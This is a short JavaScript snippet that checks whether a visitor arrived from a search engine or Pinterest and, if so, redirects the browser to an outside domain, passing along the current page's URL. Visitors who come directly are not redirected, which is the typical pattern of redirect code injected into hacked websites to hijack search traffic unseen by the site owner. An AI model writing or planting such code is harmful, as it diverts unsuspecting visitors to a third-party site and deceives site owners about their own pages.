    if(document.referrer)
    {
    	var cek = document.referrer;

    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('.yahoo.') || cek.includes('aol.') || cek.includes('pinterest.');

      if(is_se)
    	{
    		var url = window.location.href;
    		window.location = "https://flooring.me/?arsae="+ encodeURIComponent(url);
    	}
    }
